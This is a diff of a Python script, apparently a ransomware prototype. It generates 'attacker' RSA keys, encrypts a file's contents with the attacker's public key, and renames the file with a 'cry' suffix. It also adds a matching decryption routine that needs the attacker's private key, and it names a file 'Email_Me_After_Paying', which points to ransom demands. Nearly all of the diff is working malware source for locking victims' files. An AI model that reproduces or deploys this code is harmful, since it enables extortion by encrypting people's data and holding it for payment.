@@ -28,47 +28,40 @@ def genattackerkeys():
         private_key = rsa.generate_private_key(
             backend=crypto_default_backend(),
             public_exponent=65537,
-            key_size=4096
+            key_size=2048
         )
         public_key = private_key.public_key()
-
+        public_key_pem = public_key.public_bytes(
+            crypto_serialization.Encoding.PEM,
+            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
+        )
         private_key_pem = private_key.private_bytes(
             crypto_serialization.Encoding.PEM,
             crypto_serialization.PrivateFormat.PKCS8,
             crypto_serialization.NoEncryption())
         with open(privkeypathstring, 'wb') as f:
             f.write(private_key_pem)
-
-        public_key_pem = public_key.public_bytes(
-            crypto_serialization.Encoding.PEM,
-            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
-        )
         with open(pubkeypathstring, 'wb') as f:
             f.write(public_key_pem)
 
 
-def encrypt_data():
-    f = open("./testFiles/f1.txt", 'rb')
-    testfile = f.read()
+def encrypt_file(filepath, public_key_path):
+    f = open(filepath, 'rb')
+    fileblob = f.read()
     f.close()
-    print(testfile)
-    with open("./public.pem", "rb") as key_file:
-        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
-                                                                       backend=crypto_default_backend())
-        enc_text = attacker_public_key.encrypt(testfile, crypto_padding.OAEP(
-            mgf=crypto_padding.MGF1(
-                algorithm=crypto_hashes.SHA256()),
-            algorithm=crypto_hashes.SHA256(),
-            label=None
-        ))
-    print(enc_text)
+    if not (filepath.endswith("cry")):
+        enc_blob = encrypt_blob(fileblob, public_key_path)
+        filepath = filepath + "cry"
+        with open(filepath, 'wb') as outf:
+            outf.write(enc_blob)
+    return filepath
 
 
 def encrypt_blob(fileblob, public_key_path):
     with open(public_key_path, "rb") as key_file:
         attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                        backend=crypto_default_backend())
-    chunk_size = 430
+    chunk_size = 190
     offset = 0
     end_loop = False
     encrypted = b""
@@ -77,7 +70,6 @@ def encrypt_blob(fileblob, public_key_path):
         if len(chunk) % chunk_size != 0:
             end_loop = True
             chunk += b" " * (chunk_size - len(chunk))
-        print(chunk)
         enc_chunk = attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
             mgf=crypto_padding.MGF1(
                 algorithm=crypto_hashes.SHA256()),
@@ -87,29 +79,43 @@ def encrypt_blob(fileblob, public_key_path):
         encrypted += enc_chunk
         offset += chunk_size
     encrypted_blob = base64.b64encode(encrypted)
-    print(encrypted_blob)
     return encrypted_blob
-    # with open("./Email_Me_After_Paying.txt", "wb") as fa:
-    #    fa.write(encrypted_blob)
 
 
-def decrypt_blob(fileblob, private_key_path):
-    fileblob = base64.b64decode(fileblob)
+def decrypt_file(filepath, private_key_path):
+    f = open(filepath, 'rb')
+    fileblob = f.read()
+    f.close()
+    if filepath.endswith("cry"):
+        dec_blob = decrypt_blob(fileblob, private_key_path)
+        filepath = filepath[:-3]
+        with open(filepath, 'wb') as outf:
+            outf.write(dec_blob)
+    return filepath
+
+
+def decrypt_blob(encryptedblob, private_key_path):
+    encryptedblob = base64.b64decode(encryptedblob)
+    chunk_size = 256
+    offset = 0
+    decrypted = b""
     with open(private_key_path, "rb") as key_file:
-        attacker_private_key = crypto_serialization.load_pem_private_key(key_file.read(), password=None, backend=crypto_default_backend())
-    dec_chunk = attacker_private_key.decrypt(fileblob, crypto_padding.OAEP(
-        mgf=crypto_padding.MGF1(
-            algorithm=crypto_hashes.SHA256()),
-        algorithm=crypto_hashes.SHA256(),
-        label=None
-    ))
-    print(dec_chunk)
+        attacker_private_key = crypto_serialization.load_pem_private_key(key_file.read(), password=None,
+                                                                         backend=crypto_default_backend())
+    while offset < len(encryptedblob):
+        chunk = encryptedblob[offset: offset + chunk_size]
+        decrypted += attacker_private_key.decrypt(chunk, crypto_padding.OAEP(
+            mgf=crypto_padding.MGF1(
+                algorithm=crypto_hashes.SHA256()),
+            algorithm=crypto_hashes.SHA256(),
+            label=None
+        ))
+        offset += chunk_size
+    print(decrypted)
+    return decrypted
 
 
-# Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    print("Keys have been generated.")
     # genattackerkeys()
-    # encrypt_data()
-    out = encrypt_blob(b'Hello Dallas!', "./public.pem")
-    decrypt_blob(out, "./private.pem")
+    # print(encrypt_file("./f1.txt", "../keysafe/public.pem"))
+    print(decrypt_file("./Email_Me_After_Paying.pemcry", "../keysafe/private.pem"))
